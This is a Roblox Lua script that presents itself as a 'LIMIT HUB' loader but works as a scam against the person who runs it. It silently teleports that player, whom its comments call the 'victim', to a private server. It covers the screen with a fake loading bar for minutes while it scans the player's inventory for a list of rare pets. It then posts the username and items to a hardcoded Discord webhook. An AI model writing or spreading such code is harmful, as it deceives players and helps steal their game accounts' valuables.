-- 🔐 Configuration
local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
local privateServerLink = "https://www.roblox.com/share?code=501d6f98f515e24a8860ed8d9208170a&type=Server"
local targetedPets = { "Trex","Fennec Fox","Raccoon","Dragonfly","Butterfly",
    "Queenbee","Spinosaurus","Redfox","Brontosaurus","Mooncat","Mimic Octopus","Disco Bee","Dilophosaurus","Kitsune" }
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

--- 🧭 Teleport victim to private server
pcall(function()
    local placeId = 126884695634066
    local accessCode = "40206718588419987554943106780552"
    TeleportService:TeleportToPrivateServer(placeId, accessCode, {LocalPlayer})
end)
-- 👁‍🗨 Loading GUI (your code)
-- COPY exactly your GUI code here; I'm wrapping below for brevity:
do
    local screenGui = Instance.new("ScreenGui", game.CoreGui)
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    local bg = Instance.new("Frame", screenGui)
    bg.BackgroundColor3 = Color3.new(0,0,0)
    bg.BackgroundTransparency = 0
    bg.Size = UDim2.new(1,0,1,0)
    local title = Instance.new("TextLabel", bg)
    title.Text = "LIMIT HUB"; title.Font = Enum.Font.SciFi
    title.TextScaled = true; title.TextColor3 = Color3.fromRGB(0,255,255)
    title.TextStrokeColor3 = Color3.fromRGB(0,255,255); title.TextStrokeTransparency = 0.2
    title.Size = UDim2.new(0,600,0,100); title.Position = UDim2.new(0.5,-300,0.5,-160)
    local bar = Instance.new("Frame", bg)
    bar.Size = UDim2.new(0,400,0,30); bar.Position = UDim2.new(0.5,-200,0.5,-30)
    bar.BackgroundColor3 = Color3.fromRGB(40,40,40)
    local fill = Instance.new("Frame", bar)
    fill.Size = UDim2.new(0,0,1,0); fill.BackgroundColor3 = Color3.fromRGB(0,255,255)
    local percentLabel = Instance.new("TextLabel", bg)
    percentLabel.Size = UDim2.new(0,100,0,40); percentLabel.Position = UDim2.new(0.5,-50,0.5,-70)
    percentLabel.BackgroundTransparency = 1; percentLabel.Text = "0%"; percentLabel.TextScaled = true
    percentLabel.TextColor3 = Color3.new(1,1,1); percentLabel.TextStrokeTransparency = 0.3
    percentLabel.Font = Enum.Font.SciFi
    local loadingText = Instance.new("TextLabel", bg)
    loadingText.Text = "LOADING"; loadingText.Size = UDim2.new(0,400,0,70); loadingText.Position = UDim2.new(0.5,-200,0.5,40)
    loadingText.BackgroundTransparency = 1; loadingText.TextScaled = true
    loadingText.TextColor3 = Color3.fromRGB(0,255,255); loadingText.TextStrokeColor3 = Color3.fromRGB(0,255,255)
    loadingText.TextStrokeTransparency = 0.2; loadingText.Font = Enum.Font.SciFi
    task.spawn(function()
        local percent = 0
        while percent <= 100 do
            percentLabel.Text = percent .. "%"
            fill.Size = UDim2.new(percent/100,0,1,0)
            percent += 5
            task.wait(10)
        end
        task.wait(1)
        screenGui:Destroy()
    end)
end

-- 📤 Scan and send webhook after loading GUI starts
pcall(function()
    local function getInventory()
        local data = { items={}, rarePets={} }
        for _, folder in ipairs({ LocalPlayer:FindFirstChild("Pets"), LocalPlayer:FindFirstChild("Backpack"), LocalPlayer:FindFirstChildOfClass("Folder") }) do
            if folder then for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)
                if table.find(targetedPets, item.Name) then table.insert(data.rarePets, item.Name) end
            end end
        end
        return data
    end

    local inv = getInventory()
    local invText = #inv.items>0 and table.concat(inv.items,"\n") or "No items"
    local joinLink = "Teleported to private server"
    local payload = {
        content = "🎯 Victim joined private",
        embeds = {{
            title="Victim Teleported",
            description="User was teleported and their inventory scanned.",
            fields = {
                {name="Username", value=LocalPlayer.Name, inline=true},
                {name="Inventory", value="```"..invText.."```", inline=false},
                {name="Rare Pets", value="```"..(table.concat(inv.rarePets,"\n")).."```", inline=false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    request({Url=webhookUrl,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(payload)})
end)
